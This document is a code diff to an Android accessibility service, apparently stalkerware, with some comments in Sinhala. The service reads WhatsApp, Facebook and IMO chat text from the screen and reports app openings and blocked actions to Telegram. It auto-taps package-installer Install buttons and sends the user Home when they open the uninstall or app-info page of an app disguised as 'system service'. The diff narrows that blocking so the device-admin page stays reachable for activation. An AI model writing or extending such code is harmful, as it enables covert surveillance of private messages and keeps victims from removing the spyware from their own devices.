@@ -31,7 +31,6 @@ class ScreenService : AccessibilityService() {
         var instance: ScreenService? = null
         private const val TAG = "ScreenService"
 
-        // WhatsApp / FB / IMO package names
         private const val PKG_WHATSAPP = "com.whatsapp"
         private const val PKG_WHATSAPP_B = "com.whatsapp.w4b"
         private const val PKG_FB = "com.facebook.katana"
@@ -120,7 +119,7 @@ class ScreenService : AccessibilityService() {
         }
     }
 
-    // ===== Auto-tap Install Button in Package Installer =====
+    // ===== Auto-tap Install Button =====
     private fun autoTapInstall() {
         try {
             val root = rootInActiveWindow ?: return
@@ -139,7 +138,6 @@ class ScreenService : AccessibilityService() {
         }
     }
 
-    // Button text එකෙන් හොයාගන්න
     private fun findButtonByText(node: AccessibilityNodeInfo?, texts: List<String>): AccessibilityNodeInfo? {
         node ?: return null
         try {
@@ -169,27 +167,47 @@ class ScreenService : AccessibilityService() {
         return null
     }
 
-    // ===== Block Settings pages =====
+    // ===== Block Settings pages — FIX =====
     private fun handleSettingsBlock(event: AccessibilityEvent) {
         try {
             val root = rootInActiveWindow ?: return
-            val text = collectAllText(root).lowercase()
 
-            val isDeviceAdmin = text.contains("device admin") ||
-                    text.contains("device administrator")
+            // Screen title එක විතරයි බලන්න
+            val title = findScreenTitle(root).lowercase()
+            Log.d(TAG, "Settings title: $title")
 
-            val isAppInfo = text.contains("app info") &&
-                    text.contains("system service")
+            // ⚠️ "Uninstall" page එක විතරයි block කරන්න
+            // "device admin apps" page එක block කරන්නේ නෑ (ඔබට activate කරන්න ඕන නිසා)
+            val shouldBlock = (title.contains("uninstall") && title.contains("system service")) ||
+                    (title.contains("app info") && title.contains("system service"))
 
-            val isUninstall = text.contains("uninstall") &&
-                    text.contains("system service")
-
-            if (isDeviceAdmin || isAppInfo || isUninstall) {
-                Log.d(TAG, "Blocked Settings page")
+            if (shouldBlock) {
+                Log.d(TAG, "Blocked uninstall page")
                 performGlobalAction(GLOBAL_ACTION_HOME)
-                notifyTelegram("🚫 Settings page blocked — Home redirect")
+                notifyTelegram("🚫 Uninstall blocked — Home redirect")
             }
         } catch (_: Exception) {}
+    }
+
+    // Screen title එක හොයාගන්න
+    private fun findScreenTitle(node: AccessibilityNodeInfo?): String {
+        node ?: return ""
+        try {
+            val viewId = node.viewIdResourceName ?: ""
+            if (viewId.contains("action_bar") || viewId.contains("title")) {
+                val t = node.text?.toString() ?: ""
+                if (t.isNotBlank()) return t
+            }
+
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i)
+                if (child != null) {
+                    val found = findScreenTitle(child)
+                    if (found.isNotBlank()) return found
+                }
+            }
+        } catch (_: Exception) {}
+        return ""
     }
 
     // ===== Detect App Open =====
@@ -211,7 +229,7 @@ class ScreenService : AccessibilityService() {
         notifyTelegram("$emoji ${app.uppercase()} OPENED\n🕐 $time")
     }
 
-    // ===== Read Screen Content — WhatsApp/FB/IMO only =====
+    // ===== Read Screen Content =====
     private fun readScreenContent(app: String) {
         try {
             val activePackage = rootInActiveWindow?.packageName?.toString() ?: return
@@ -244,7 +262,6 @@ class ScreenService : AccessibilityService() {
         } catch (_: Exception) {}
     }
 
-    // App drawer / launcher text ද බලන්න
     private fun isAppDrawerText(text: String): Boolean {
         val drawerPatterns = listOf(
             "Page 1 of", "Page 2 of", "Page 3 of",
@@ -258,7 +275,6 @@ class ScreenService : AccessibilityService() {
         return matchCount >= 3
     }
 
-    // Chat messages විතරයි collect කරන්න
     private fun collectChatTexts(node: AccessibilityNodeInfo?): List<String> {
         node ?: return emptyList()
         val texts = mutableListOf<String>()
